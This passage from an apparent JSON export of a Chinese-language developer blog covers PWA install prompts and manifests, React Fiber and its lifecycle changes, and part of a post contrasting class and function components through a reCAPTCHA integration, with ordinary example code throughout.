.catch(err => &#123; console.log('err:', err) &#125;) ) 像上面的程式碼就是針對路徑中含有api的 request 做快取，這樣在離線時也可以利用以前快取住的 API response。 Workbox 針對這種動態的快取提供幾種策略，分別是：staleWhileRevalidate、cacheFirst、networkFirst、networkOnly 與cacheOnly，其實看名字就可以大概理解策略是什麼了，想知道詳細的內容可以參考官方文件：Workbox Strategies。 總之自從有了 Workbox 之後，基本上就不用自己手寫 SW 了，都靠著它提供的 API 以及功能就行了，就可以自動產生出符合需求的 SW。 Add to home screen banner最後要來談的是「安裝 PWA」這一塊，在 iOS Safari 上面別無他法，就只能自己叫出選單然後選取「Add to home screen」，可是在 Android Chrome 上面，如果你符合一定的條件（有設置mainfest.json以及有註冊 Service Worker），就會自動幫你跳出一個可愛的 Install banner。 （圖片來自：Changes to Add to Home Screen Behavior） 根據 Chrome 版本的不同，行為也有所不同。 在 Chrome 67（含）以前的版本，如果你在beforeinstallprompt事件裡面沒有特別用preventDefault()，或是顯式的呼叫了prompt()，就會出現最左邊那個頗大的 A2HS banner。 然後在 Chrome 68（含）之後的版本，無論你做了什麼，系統都會自動出現那個 Mini-infobar，但如果使用者關掉的話，要隔三個月才會再出現一次，實在是有夠久。 接著呢，上面這兩個 A2HS banner 跟 Mini-infobar，使用者點擊之後都會出現最右邊的 A2HS Dialog，提示使用者要不要安裝 PWA。 但是在 Chrome 68 以後，你也可以利用程式去呼叫beforeinstallprompt裡面拿到的event.prompt()把這個 dialog 顯示出來。 聽起來有點複雜對吧？ 先來介紹beforeinstallprompt這個 event 好了，這個 event 在一切都準備就緒，確認你滿足條件可以顯示 prompt 的時候會被觸發，會傳來一個 event，你可以阻止顯示 prompt，把這個 event 存起來： // 此範例來自上面的官方文件 let installPromptEvent; window.addEventListener('beforeinstallprompt', (event) => &#123; // Prevent Chrome &lt;= 67 from automatically showing the prompt event.preventDefault(); // Stash the event so it can be triggered later. installPromptEvent = event; // Update the install UI to notify the user app can be installed document.querySelector('#install-button').disabled = false; &#125;); 為什麼要存起來呢？因為使用者可能不想一打開網站就看到這個彈窗，或者他可能正在結帳結果你跳這個東西來干擾他，所以先把它存起來，等適當的時機再呼叫installPromptEvent.prompt()來跳出 Dialog。 但要注意的事情是你直接呼叫installPromptEvent.prompt()是沒用的，你必須要within a user gesture，意思就是你要放在按鈕的 click 事件（或其他由使用者觸發的事件）裡才有效，直接呼叫是沒有用的，而且會看到 console 跳出錯誤訊息。 我之前一度很好奇它是怎麼做判斷的，後來發現原來有event.isTrusted可以用，可以判斷一個事件是不是被使用者主動觸發的，參考資料：MDN - Event.isTrusted。 總之呢，因為在不同版本上的 Chrome 有不同行為，所以最後我們決定用下面的程式碼針對不同版本有不同的反應： // 把 event 存起來 var installPromptEvent // 要顯示 prompt 的延遲 var showTime = 30 * 1000 window.addEventListener('beforeinstallprompt', function (e) &#123; e.preventDefault() installPromptEvent = e var data = navigator.userAgent.match(/Chrom(e|ium)\\\\/([0-9]+)\\\\./) var version = (data &amp;&amp; data.length >= 2) ? parseInt(data[2], 10) : null if (version &amp;&amp; installPromptEvent.prompt) &#123; // 延遲一段時間才顯示 prompt setTimeout(function() &#123; // 如果 Chrome 版本是 67（含）以下，可以直接呼叫 if (version &lt;= 67) &#123; installPromptEvent.prompt() return &#125; // 否則的話必須透過 user action 主動觸發 // 這邊幫 #root 加上 event listener，代表點擊螢幕任何一處都會顯示 prompt document.querySelector('#root').addEventListener('click', addToHomeScreen) &#125;, showTime) &#125; &#125;); function addToHomeScreen(e) &#123; if (installPromptEvent) &#123; installPromptEvent.prompt() installPromptEvent = null document.querySelector('#root').removeEventListener('click', addToHomeScreen) &#125; &#125; 如果是 67 以下，直接呼叫就可以顯示 prompt，否則的話還要再一步，要加個 event listener 才行，而我們也選擇延遲 30 秒才顯示。 出乎意料地，這樣一個小改動帶來驚人的成長，原本一天大概才 20、30 個人安裝 PWA，經過這樣調整之後瞬間變成八到十倍，看到 GA 的那個統計圖我也嚇了一跳，沒想到效果這麼好。 與其一直積極地要別人快點安裝 PWA，還不如只要求真的對你產品有興趣（停留超過 30 秒鐘）的人。 manifest 觀摩最後我們來看看幾個知名的 PWA 都是怎麼寫他們的manifest.json。 第一個是 PWA 界中很有名的 flipkart： &#123; \"name\": \"Flipkart Lite\", \"short_name\": \"Flipkart Lite\", \"icons\": [ &#123; \"src\": \"https://img1a.flixcart.com/www/linchpin/batman-returns/logo_lite-cbb3574d.png\", \"sizes\": \"192x192\", \"type\": \"image/png\" &#125; ], \"gcm_sender_id\": \"656085505957\", \"gcm_user_visible_only\": true, \"start_url\": \"/?start_url=homescreenicon\", \"permissions\": [ \"gcm\" ], \"orientation\": \"portrait\", \"display\": \"standalone\", \"theme_color\": \"#2874f0\", \"background_color\": \"#2874f0\" &#125; 再來是鼎鼎大名的 twitter： &#123; \"background_color\": \"#ffffff\", \"description\": \"It's what's happening. From breaking news and entertainment, sports and politics, to big events and everyday interests.\", \"display\": \"standalone\", \"gcm_sender_id\": \"49625052041\", \"gcm_user_visible_only\": true, \"icons\": [ &#123; \"src\": \"https://abs.twimg.com/responsive-web/web/ltr/icon-default.604e2486a34a2f6e.png\", \"sizes\": \"192x192\", \"type\": \"image/png\" &#125;, &#123; \"src\": \"https://abs.twimg.com/responsive-web/web/ltr/icon-default.604e2486a34a2f6e.png\", \"sizes\": \"512x512\", \"type\": \"image/png\" &#125; ], \"name\": \"Twitter\", \"share_target\": &#123; \"action\": \"compose/tweet\", \"params\": &#123; \"title\": \"title\", \"text\": \"text\", \"url\": \"url\" &#125; &#125;, \"short_name\": \"Twitter\", \"start_url\": \"/\", \"theme_color\": \"#ffffff\", \"scope\": \"/\" &#125; 最後則是 Google I&#x2F;O 2018： &#123; \"name\": \"Google I/O 2018\", \"short_name\": \"I/O 2018\", \"start_url\": \"./?utm_source=web_app_manifest\", \"display\": \"standalone\", \"theme_color\": \"#6284F3\", \"background_color\": \"#6284F3\", \"icons\": [&#123; \"src\": \"static/images/homescreen/homescreen57.png\", \"sizes\": \"57x57\", \"type\": \"image/png\" &#125;, &#123; \"src\": \"static/images/homescreen/homescreen114.png\", \"sizes\": \"114x114\", \"type\": \"image/png\" &#125;, &#123; \"src\": \"static/images/homescreen/homescreen128.png\", \"sizes\": \"128x128\", \"type\": \"image/png\" &#125;, &#123; \"src\": \"static/images/homescreen/homescreen144.png\", \"sizes\": \"144x144\", \"type\": \"image/png\" &#125;, &#123; \"src\": \"static/images/homescreen/homescreen192.png\", \"sizes\": \"192x192\", \"type\": \"image/png\" &#125;, &#123; \"src\": \"static/images/homescreen/homescreen512.png\", \"sizes\": \"512x512\", \"type\": \"image/png\" &#125;], \"prefer_related_applications\": false, \"related_applications\": [&#123; \"platform\": \"play\", \"id\": \"com.google.samples.apps.iosched\" &#125;], \"gcm_sender_id\": \"103953800507\" &#125; 我滿喜歡觀察別人家的這些東西，因為你會發現很多你查資料時遺漏或是根本找不到的資訊，而且這些看久了你也會有個概念，知道哪些屬性特別常用，除了manifest.json以外，也可以參考 html 裡面的 tag，一樣能學習到很多。 結論前陣子在與 PWA 奮戰以及被 PM 的夾擊之下，搜集了很多跟 PWA 有關的資料，也參考了許多很有用的文章，真心感謝那些前輩們的分享，才能避免後人踩一大堆坑。 雖然在 iOS 上的體驗差了點，但整體來說我還是很看好 PWA 的發展，第一個是 Google 強力推動，第二個是瀏覽器的支援度愈來愈高，就像我上面說的，iOS Safari 已經有慢慢把 Bug 給修掉了，之後的功能會比較完整一些。 再者，PWA 的使用者體驗是很不錯的，有可以接受的速度以及 Web 的彈性，重點是不用去 Google Play 特地下載就少了一道轉換的門檻（雖然還是有安裝 PWA 的門檻就是了，但我覺得比較容易一些），而 Chrome 也提供了許多機制給 PWA，希望使用者能安裝 PWA 在手機上。 總之呢，這篇主要是跟大家分享我在做 PWA 時候的一些小小心得，如果你也有什麼心得歡迎在底下留言跟我分享，感謝。 延伸閱讀與參考資料： Changes to Add to Home Screen Behavior Progressive Web App Splash Screens Few Tips That Will Make Your PWA on iOS Feel Like Native PWAs are coming to iOS 11.3: Cupertino, we have a problem Progressive Web App 會是未來趨勢嗎？ PWA case studies A Pinterest Progressive Web App Performance Case Study","link":"/2018/10/13/pwa-in-action/"},{"title":"淺談 React Fiber 及其對 lifecycles 造成的影響","text":"前言雖然說從以前就一直聽到 React 要把內部的 reconciler 換成一個叫做 Fiber 的東西，但從沒仔細研究過，也不知道這樣子的改變會對上層造成什麼影響。 真正開始比較深入理解，是在某一次使用 Redux Form 時踩到一個相關的 bug，才知道 React 自從正式改用 Fiber 之後，其實對上層也有一些改變。 這篇的標題「淺談」不是騙你的，這篇真的很淺，我不會談到 Fiber 底層的運作（因為我也還沒認真研究過），只會用白話文跟你說 Fiber 大概是怎樣，是為了解決什麼樣子的問題而誕生。 萬里之行，始於 Bug每一次能踩到 Bug 的機會，我都會好好把握。 為什麼？因為這是一次強迫你學習的機會。Bug 解不掉，你就沒辦法繼續下去，所以為了要解決 Bug，你必須去探究原因，必須知道這個問題為什麼產生，以及應該要怎麼解決。 當然，你也可以直接從 Stack Overflow 找答案然後複製貼上，覆蓋這張牌結束這回合。可是工作久了你會發現，不是所有問題都可以從那上面找到解答。 舉例來說，我一年前寫的我遇過的最難的 Cookie 問題對我來說就是一個很好的學習機會。 好，那這次我又是遇到什麼 Bug 呢？ 我們公司的產品有用到redux-form，而問題是這樣的，我有兩個頁面，都用了同一個 component，叫做FormBlock好了。 我先去 A 頁面，再去 B 頁面，再回來 A 頁面，我的 redux-form 的 validation 就失效了，在表單 submit 的時候並不會執行 validation。 那時候搜到了幾個相關的 issue，但還是想自己查個清楚，就跑去找了 redux-form 的原始碼，研究了幾個小時終於找到出問題的地方。 在 redux-form 執行 validation 的時候，會先檢查 fields 是不是有被註冊過，如果沒被註冊的話，就直接回傳true，不會進行任何驗證，我自己加了幾個 console.log 之後，發現問題就是出在這邊，field 沒有被註冊到。 接著就來找一下是在哪邊註冊的，發現在componentWillMount的時候，會 dispatch 一個 action 來註冊所有的表單欄位（REGISTER_FIELD）。 然後在componentWillUnmount的時候，redux-form 會 dispatch 一個 action 叫做DESTROY（相關程式碼），把所有註冊的 field 給清掉。 到目前為止，一切看似都很合理。我在離開 B 頁面的時候，觸發FormBlock的componentWillUnmount，取消註冊所有的 field，在進入 A 頁面時，觸發FormBlock的componentWillMount，把所有的 field 重新註冊回來。 可是如果你打開 redux-devtool，會發現順序跟你想像中不太一樣： 咦？怎麼會先註冊再刪除？而且因為刪除了，所以驗證就失效了，不會執行任何驗證的邏輯。 再仔細找了一下相關的資料，看到這篇 Browser back button not working with react-router@4.0.0-beta.7 and react@16-alpha.4 Issue 以及 Redux 以及 React 的開發者 gaearon 在下面的回答： In React 15, if A is replaced by B, we unmount A, and then create and mount B: A.componentWillUnmount B.constructor B.componentWillMount B.componentDidMount In Fiber, we create B first, and only later unmount A and mount B: B.constructor B.componentWillMount A.componentWillUnmount B.componentDidMount 在 React 16 以後，由於這樣子的順序改變，導致了上面 redux-form 的 lifecycle 執行順序跟預期中不符，也間接導致了我開頭所說的那個 Bug。 到了這邊，問題產生的原因一路從 redux-form 本身追到了 React，又更細節的追到了 Fiber，看來，沒辦法再繼續逃避 Fiber 了。 先一併奉上跟 redux-form 以及執行順序相關的其他參考資料，再讓我們好好看看 Fiber。 Re-mounting a Field component erases the field-level validation function Ordering of componentWillMount&#x2F;Unmount in React 16 Asynchronous ComponentWillUnmount in React 16 Fiber 到底是什麼？要瞭解一個新的東西，最快的方式就是回答以下問題： 它是拿來解決什麼問題的？ 解決方法是什麼？ 只要能了解這兩個問題，就能對這個新的東西有初步的概念，儘管你還是不知道實作細節，但至少你知道它帶來的影響及改變是什麼。 我們先來看一下一直存在於 React 的一個問題。 假設你現在有一個超級多功能的 App，有著超級多的 Component，然後你改變了最上層的 Component（假設它叫&lt;App /&gt;） 的 state。 因為 state 變了，所以就會來執行這個&lt;App /&gt;的 render function，然後執行App底下的 component 的 render function，就這樣一直往下執行下去，直到碰到最底層為止。 你如果去看 call stack，就會發現這個 call stack 超大一個： （圖片來源：React Fiber現状確認） 這樣會造成什麼問題呢？因為你的 call stack 太深而且東西太多，再加上這個過程又是不能被中斷的，會導致 main thread 被 block 住，在這時間之內你做任何事情，瀏覽器都不會有反應。 簡單來說呢，就是因為要做的事太多，所以 main thread 就會 block 住了，這就是 React 在效能上會碰到的一個問題。 到這邊，我們已經回答第一個問題了，Fiber 就是為了解決這個問題而產生的解法。接著我們來回答第二個問題：解決方法是什麼？ 既然問題的成因是：「要做的事情太多又不能中斷」，那我們只要發明一個「可以中斷」的機制就好啦！不要一次全部更新，而是增量更新（incremental rendering），就可以解決這個問題了！ 比起原本的一次性更新，假如我們能夠把要更新的工作切成一個個小的工作，每次只執行一個小工作，那這樣 main thread 就不會被 block 住了，因為每個小工作之間都可以有空檔去做別的事情（響應使用者的點擊、繪製新的畫面等等）。 就像下面這張示意圖一樣，每次完成一點點的工作，而不是一次完成全部的： （圖片來源：Lin Clark - A Cartoon Intro to Fiber - React Conf 2017 ） 好了，你已經知道什麼是 Fiber 了，這就是 Fiber。每一個小工作就叫做 Fiber，而 Fiber 在英文裡面是纖維的意思，所以又有人把這個機制稱作「纖程」。 或是換個角度想，原本的問題是因為程式裡面這樣子一層層執行 render function 的方法是透過 call stack，每次 call 一個 function 就把一個新的任務丟到 stack frame 去，可是這樣子的機制會導致任務無法中斷。 於是 Fiber 就實作出了 virtual stack frame，簡單來說就是自己用 js 再模擬出一個 call stack 的感覺，但好處就是自己有完全的掌控權，而不是被 js 的運行機制給綁住。 再幫大家重新整理一次，沒有 Fiber 之前，你要更新的時候都是「一次性」的更新，中間無法中斷，導致 main thread 在這期間會被 block 住。 有了 Fiber 這個機制之後，我們把一個大更新切成很多塊小的更新，每次只更新一點點，這樣子在更新的空檔 main thread 就能去做其他事情，而不會被綁住。 聽起來十分美好，問題迎刃而解，可是副作用是什麼呢？ Fiber 所帶來的改變把核心換成 Fiber 之後，是要付出一些代價的。在 Fiber 裡面的工作其實分成兩個階段： render&#x2F;reconciliation commit 簡單來說呢，第一階段就是找出需要改變的部分，而第二階段是真正的把這些改變應用到 DOM 上面去。第一階段是可以被中斷，也可以被重新執行的，而第二階段跟以前一樣，必須一口氣做完。 而這兩個階段也對應到不同的生命週期： 第一階段 componentWillMount componentWillReceiveProps shouldComponentUpdate componentWillUpdate 第二階段 componentDidMount componentDidUpdate componentWillUnmount 因為第一階段是可以中斷並且之後再重新執行的，所以會導致在第一階段裡的這些函數，有可能被 call 很多次。 （圖片來源：Lin Clark - A Cartoon Intro to Fiber - React Conf 2017 ） 所以，假設你之前習慣在componentWillMount裡面就呼叫 API 拿資料的話，就會導致你 call 了不只一次的 API，會浪費一些頻寬，要改變的話就要把這些 code 移到componentDidMount去，就只會保證被 call 一次而已。 總之呢，自從內部機制改成 Fiber 之後（從 React 16 開始，所以如果你是用 16 以上的版本，已經是 Fiber 了），React 的生命週期函數被呼叫的次數跟方式會跟以前不太一樣。 除此之外就是我開頭提的那個順序的不一樣，這點也是值得注意的一個部分。雖然看起來不是什麼大問題，但如果不知道這點的話可能會生出一些莫名其妙的 Bug。 React 的未來React 16.3 在昨天正式發佈了，伴隨而來的是正式的 context API 以及 lifecycle 的改變。 隨著 Fiber 的正式上線，未來可以期待會有更多令人興奮的新功能。比如說在Sneak Peek: Beyond React 16這篇提到的time slicing，把整個 App 的體驗變得更順暢。 而Update on Async Rendering這篇文章也提到了非同步渲染的進展。 自從內部的機制改成 Fiber 之後，就讓 async rendering 得以發揮最大的效能。 但為了 async rendering，是需要付出一些代價的。原本的 lifecycle API 在這種場景底下可能會有一些問題，官方有給出許多常見的例子，也包含我們上面所說到的，componentWillMount會被呼叫多次的問題： （忽略原本的範例程式碼，但大意就是在componentWillMount裡面 call API） The above code is problematic for both server rendering (where the external data won’t be used) and the upcoming async rendering mode (where the request might be initiated multiple times). The recommended upgrade path for most use cases is to move data-fetching into componentDidMount 對於 async rendering，會引起問題的是以下三個生命週期： componentWillMount componentWillReceiveProps componentWillUpdate 這三個 lifecycle 會在 React 17 裡面被拿掉（如果你還是想用的話可以加上UNSAFE_，例如說改成UNSAFE_componentWillMount就一樣可以用），但既然都說是 UNSAFE 了，沒有理由繼續使用下去。 舊的不去新的不來，在最新發佈的 16.3 中，引入了兩個新的 lifecycle 來解決上面的那些問題： getDerivedStateFromProps getSnapshotBeforeUpdate 第一個很顯然是要來取代componentWillReceiveProps的，而第二個是拿來取代componentWillUpdate的。或其實有些場景底下，用componentDidUpdate也可以取代原本那兩個生命週期。 至於最前面所提到的componentWillMount，則建議把裡面的程式碼搬到componentDidMount去。 接著讓我們快速來看一下新的生命週期如何替代舊的，以下我就直接使用官方給的範例了。這個範例會偵測 props 來決定要不要改變 state，是很常見的應用場景： // Before class ExampleComponent extends React.Component &#123; state = &#123; isScrollingDown: false, &#125;; componentWillReceiveProps(nextProps) &#123; if (this.props.currentRow !== nextProps.currentRow) &#123; this.setState(&#123; isScrollingDown: nextProps.currentRow > this.props.currentRow, &#125;); &#125; &#125; &#125; 而新的生命週期static getDerivedStateFromProps，會在 component 被建立還有收到新的 props 的時候被呼叫，但只會傳入新的 props 跟舊的 state，因此我們可以這樣改： // After class ExampleComponent extends React.Component &#123; // 初始化 state state = &#123; isScrollingDown: false, lastRow: null, &#125;; static getDerivedStateFromProps(nextProps, prevState) &#123; // 把新的 props 跟舊的 state 做比較 if (nextProps.currentRow !== prevState.lastRow) &#123; // 回傳新的 state return &#123; isScrollingDown: nextProps.currentRow > prevState.lastRow, lastRow: nextProps.currentRow, // 同步一下 state &#125;; &#125; // return null 代表不用改變 state return null; &#125; &#125; 其實說穿了就只是你自己把以前componentWillReceiveProps會傳來的prevProps存到 state 裡面，改成跟 state 來比較而已。 看到這邊你可能會很疑惑：「那為什麼 getDerivedStateFromProps 不直接把 prevProps 傳進來就好？」 React 官方給的理由有兩個： 因為 getDerivedStateFromProps 在初始化的時候也會被 call，所以第一次的 prevProps 會是 null，代表你每次都要做一次 null check，這樣不好 不傳 prevProps 就代表 React 不用幫你記住 prevProps 了，對未來在記憶體上面的優化有幫助 總之呢，以後就不會有componentWillReceiveProps可以用了，你要自己把需要的prevProps保存在 state 裡面，並且在getDerivedStateFromProps裡面進行比較。 再看另外一個例子，這個例子的目的是要在新增 item 的時候維持捲軸的位置，所以必須在 update 之前保存舊的高度，在 update 之後去調整捲軸的位置： class ScrollingList extends React.Component &#123; listRef = null; previousScrollHeight = null; componentWillUpdate(nextProps, nextState) &#123; // 有新增 item 的話，記住現在的高度 if (this.props.list.length &lt; nextProps.list.length) &#123; this.previousScrollHeight = this.listRef.scrollHeight; &#125; &#125; componentDidUpdate(prevProps, prevState) &#123; // 如果 previousScrollHeight 不是 null，代表有新增 item // 調整捲軸位置 if (this.previousScrollHeight !== null) &#123; this.listRef.scrollTop += this.listRef.scrollHeight - this.previousScrollHeight; this.previousScrollHeight = null; &#125; &#125; render() &#123; return ( &lt;div ref=&#123;this.setListRef&#125;> &#123;/* ...contents... */&#125; &lt;/div> ); &#125; setListRef = ref => &#123; this.listRef = ref; &#125;; &#125; 那這樣子會帶來的問題是什麼呢？還記得我們前面有提過 Fiber 有兩個階段嗎？render 跟 commit。這兩個階段會有時間差，而componentWillUpdate是處於第一個階段，componentDidUpdate是屬於第二個階段。 假如使用者在這兩個階段之間做了一些事情，例如說調整視窗的尺寸，那你存的高度就不會是正確的了，而是會拿到舊的值。 解決方法就是利用新的生命週期getSnapshotBeforeUpdate，這個會在 DOM 被更新之前呼叫，可以保證你拿到的東西一定是最新的。 class ScrollingList extends React.Component &#123; listRef = null; getSnapshotBeforeUpdate(prevProps, prevState) &#123; // 如果 list 有變動，就回傳現在的捲軸高度 // 這個回傳值會被當作 componentDidUpdate 的第三個參數 if (prevProps.list.length &lt; this.props.list.length) &#123; return this.listRef.scrollHeight; &#125; return null; &#125; componentDidUpdate(prevProps, prevState, snapshot) &#123; // snapshot 就是上面回傳的那個值 // 如果不是 null，就利用 snapshot 來調整捲軸高度 if (snapshot !== null) &#123; this.listRef.scrollTop += this.listRef.scrollHeight - snapshot; &#125; &#125; render() &#123; return ( &lt;div ref=&#123;this.setListRef&#125;> &#123;/* ...contents... */&#125; &lt;/div> ); &#125; setListRef = ref => &#123; this.listRef = ref; &#125;; &#125; 總之呢，結合搭配使用 commit phase 的 lifecycle（componentDidMount、componentDidUpdate、componentWillUnmount ）以及新引進的getDerivedStateFromProps與getSnapshotBeforeUpdate ，就可以取代掉舊的那些有可能會造成問題的 lifecycle。 如果想要看更多範例的話，這篇很值得參考：Update on Async Rendering。 結論效能一直是 Web App 很注重的一個點，而需要把握的原則就只有一個：不要 block main thread。只要 main thread 可以做事，它就可以去處理其他事情，例如說響應使用者的 click 或是繪製新的畫面等等。 而 React 原本的機制會造成問題，因此將內部核心用 Fiber 改寫，把一大個不可中斷的任務切割成許多小的、可以中斷的工作，而可以切割之後也使得以後有平行化的可能，render 的速度可能又會更快一點。 但也因為這樣機制的改變，影響到原本的生命週期，一個不小心就會出狀況，而官方也發布了新的兩個生命週期來解決這個問題。 身為 React 長期的使用者，對這種大的改變雖然覺得要改 code 很煩，但長期來看其實是利多，畢竟可以做的事情又更多了，效能也會愈來愈好。 這篇總結了近期我研究 Fiber 跟關注 React 新的變化的一些心得，Fiber 底層的實作機制因為我也不是很理解，所以不敢出來班門弄斧，只希望能透過白話文讓大家理解這個機制大概是長怎樣。 如果有哪邊有講錯，還麻煩不吝指正，感謝。 參考資料： React Fiber Architecture What is React Fiber ? React中state render到html dom的流程分析 完全理解React Fiber [翻譯] React Fiber 現狀確認 React v16.3.0: New lifecycles and context API React Docs - Scheduling 浅谈React 16中的Fiber机制 Lin Clark - A Cartoon Intro to Fiber - React Conf 2017","link":"/2018/03/31/react-fiber-and-lifecycles/"},{"title":"從實際案例看 class 與 function component 的差異","text":"前言要學習一個新的東西，光用看的還真的沒什麼用，直接動手下去做才是比較好的方法。因為上一份工作快離職時 React hook 才剛出來，所以我之前從來沒寫過 hook，只有看過一些基本的教學而已。而前陣子開始工作之後，才終於開始寫 function component + hook。 雖然剛開始還是滿懷念 class 的寫法，但寫久之後覺得 hook 也挺不錯的。在使用 hook 的過程中也有碰到一些剛轉換的人常碰到的問題，仔細研究後發現這篇文章要提的案例還滿不錯的，如果能夠理解這個案例，應該就可以掌握到 class 與 function component 根本上的不同，因此寫了這篇來記錄一下心得。 話說如果你已經寫 function component 一陣子，hook 也用得滿習慣的，而且都有把官方文件還有 dan 哥的文章好好看過，基本上不會從這篇文章獲得任何新知識。這篇適合的對象是剛轉換到 function component，而且不太確定跟 class 的差異是什麼的人。 實際案例這個案例是我在串接 Google reCAPTCHA 的時候所碰到的，所以讓我先來順便講一下 reCAPTCHA 的串接。 相信大家應該都對 reCAPTCHA 不陌生，因為在網路上滿常看到的。目前有分成兩個版本，v2 跟 v3，然後 v2 也有分幾個不同的型態，其中有一個叫做 checkbox 的版本，就是我們最常見的那個要你勾選「我不是機器人」的框框： 串接方法很簡單，首先你必須載入 reCAPTCHA 的 script： &lt;script src=\"https://www.google.com/recaptcha/api.js?onload=onloadCallback&amp;render=explicit\" async defer> &lt;/script> onload 這個參數需要傳給他 callback function 的名稱，在 script 載入完成以後會呼叫。而 render=explicit 則是告訴他說我們要自己呼叫程式碼去 render 出那個框框（另外一種 implicit 可以透過 data-xxx 這種形式把屬性放在 html 元素，讓 Google 自己去渲染出那個框框）。 當 script 載入完成以後，會去呼叫你提供的 callback function，也會多一個全域變數 grecaptcha 可以使用，再來你就可以用： grecaptcha.render('html_element', &#123; sitekey : 'your_site_key', callback: function(token) &#123; console.log(token) &#125; &#125;); &#125;; 把 html_element 變成顯示 reCAPTCHA 的框框，並且在使用者點選時透過傳入的 callback function 拿到 token。 這邊我有做了一個小範例：codepen，畫面長得像這樣： 程式碼其實很簡單： &lt;div id&#x3D;&quot;robot&quot;&gt;&lt;&#x2F;div&gt; Your token: &lt;div id&#x3D;&quot;token&quot;&gt;&lt;&#x2F;div&gt; window.onloadCallback = function() &#123; grecaptcha.render(document.querySelector('#robot'), &#123; // test site key from https://developers.google.com/recaptcha/docs/faq sitekey : '6LeIxAcTAAAAAJcZVRqyHh71UMIEGNQ_MXjiZKhI', callback: function(token) &#123; document.querySelector('#token').innerText = token &#125; &#125;); &#125;; 好，這個 reCAPTCHA 就是我們今天的主角。在介紹完使用方法以後，我們來看一下在 React 裡應該要怎麼來實作。 React 實作：Class component 版在新增一個 component 的時候，我會先思考一件事，那就是我想要怎麼用它。這點非常重要，因為會決定這個元件長什麼樣子。 如果有一個 reCAPTCHA 的元件，我會希望能這樣用： &lt;ReCAPTCHA sitekey=&#123;siteKey&#125; onChange=&#123;onChange&#125; /> 這個 component 應該要能做到： 自動幫我們載入需要的 script 自動產生一個 checkbox 的元素 當使用者打勾時，透過 onChange 把 token 傳回來 接著就讓我們來實作這個 component 吧！完整的程式碼會長這樣： class ReCAPTCHA extends React.Component &#123; constructor(props) &#123; super(props); this.divRef = React.createRef(); this.callbackName = \"__recaptcha__cb\"; &#125; componentDidMount() &#123; // 檢查是否已經載入完成 if (!window.grecaptcha) &#123; return this.init(); &#125; this.handleLoad(); &#125; // 負責來執行 callback function handleCallback = token => &#123; this.props.onChange(token); &#125;; handleLoad = () => &#123; // 載入完成，渲染元素 const &#123; sitekey &#125; = this.props; window.grecaptcha.render(this.divRef.current, &#123; sitekey, callback: this.handleCallback &#125;); &#125;; init = () => &#123; window[this.callbackName] = this.handleLoad; const script = document.createElement(\"script\"); script.src = `https://www.google.com/recaptcha/api.js?onload=$&#123; this.callbackName &#125;&amp;render=explicit`; script.async = true; document.body.appendChild(script); &#125;; render() &#123; return &lt;div ref=&#123;this.divRef&#125; />; &#125; &#125; 在 componentDidMount 的時候我們去檢查是不是已經有 grecaptcha 的存在，沒有的話就載入，有的話就直接呼叫 this.handleLoad，並且在裡面處理 render 的相關事項。而載入的部分則是動態產生 script 標籤插入到 document 裡面，我們就不用自己在 HTML 手動把 script 引入，方便很多。而 handleLoad 的地方其實就只是呼叫上面有寫過的 grecaptcha.render 而已： handleLoad = () => &#123; // 載入完成，渲染元素 const &#123; sitekey &#125; = this.props; window.grecaptcha.render(this.divRef.current, &#123; sitekey, callback: this.handleCallback &#125;); &#125;; 做完這個 component 之後，上層去 render 它，然後傳入一個 onChange 的 callback function，最後介面會長這樣： 完整程式碼會長這樣： import React, &#123; useState &#125; from \"react\"; class ReCAPTCHA extends React.Component &#123; constructor(props) &#123; super(props); this.divRef = React.createRef(); this.callbackName = \"__recaptcha__cb\"; &#125; componentDidMount() &#123; // 檢查是否已經載入完成 if (!window.grecaptcha) &#123; return this.init(); &#125; this.handleLoad(); &#125; handleCallback = token => &#123; this.props.onChange(token); &#125;; handleLoad = () => &#123; // 載入完成，渲染元素 const &#123; sitekey &#125; = this.props; window.grecaptcha.render(this.divRef.current, &#123; sitekey, callback: this.handleCallback &#125;); &#125;; init = () => &#123; window[this.callbackName] = this.handleLoad; const script = document.createElement(\"script\"); script.src = `https://www.google.com/recaptcha/api.js?onload=$&#123; this.callbackName &#125;&amp;render=explicit`; script.async = true; document.body.appendChild(script); &#125;; render() &#123; return &lt;div ref=&#123;this.divRef&#125; />; &#125; &#125; const sitekey = \"6LeIxAcTAAAAAJcZVRqyHh71UMIEGNQ_MXjiZKhI\"; export default function App() &#123; const [token, setToken] = useState(\"\"); return ( &lt;div className=\"App\"> &lt;ReCAPTCHA sitekey=&#123;sitekey&#125; onChange=&#123;setToken&#125; /> &lt;h2>Token&lt;/h2> &lt;p>&#123;token&#125;&lt;/p> &lt;/div> ); &#125; 這邊有完整的 codesandbox demo：https://codesandbox.io/s/practical-rgb-r785j?file=/src/App.js （備註：這個 component 其實有些問題沒有解掉，但因為重點不在撰寫 reCAPTCHA library，所以就不多提了） 這個 component 其實有一個重點，那就是在 componentDidMount 的時候我們去檢查 script 是不是已經載入完畢，沒有的話就先載入，載入完成以後執行 window.grecaptcha.render。而 window.grecaptcha.render 這個 function 只會被呼叫一次而已。除非 component 被 unmount 然後再被 mount，才會再呼叫一次 window.grecaptcha.render。 而事實上如果你想在「同一個元素（this.divRef）」身上呼叫第二次 window.grecaptcha.render 也是不行的，會跳出一個錯誤提示：Uncaught Error: reCAPTCHA has already been rendered in this element，跟你說這個元件已經被 render 過了。 而這篇文章其實就跟這個行為有關，因為這個元件不能再被 render 一次，所以我們的重點是：「window.grecaptcha.render 只能呼叫一次，而且一旦設定好 callback function，就不能改變了」。 理解這個重點以後，reCAPTCHA 其實就可以退場了。因為這篇會出現 reCAPTCHA，就只是因為它的這個行為而已。我們其實可以自己模擬一次這個行為，然後改寫成一個 function： import React, &#123; useState &#125; from \"react\"; let isCalled = false; const grecaptcha = &#123; render: function(element, &#123; callback &#125;) &#123; if (isCalled) throw new Error(\"You can only call me once\"); isCalled = true; element.innerText = \"click me if you are not robot\"; element.addEventListener(\"click\", function() &#123; callback(\"you got token!\"); &#125;); &#125; &#125;; class ReCAPTCHA extends React.Component &#123; constructor(props) &#123; super(props); this.divRef = React.createRef(); &#125; componentDidMount() &#123; this.handleLoad(); &#125; handleCallback = token => &#123; this.props.onChange(token); &#125;; handleLoad = () => &#123; grecaptcha.render(this.divRef.current, &#123; callback: this.handleCallback &#125;); &#125;; render() &#123; return &lt;div ref=&#123;this.divRef&#125; />; &#125; &#125; export default function App() &#123; const [token, setToken] = useState(\"\"); return ( &lt;div className=\"App\"> &lt;ReCAPTCHA onChange=&#123;setToken&#125; /> &lt;h2>Token&lt;/h2> &lt;p>&#123;token&#125;&lt;/p> &lt;/div> ); &#125; 介面長這樣： 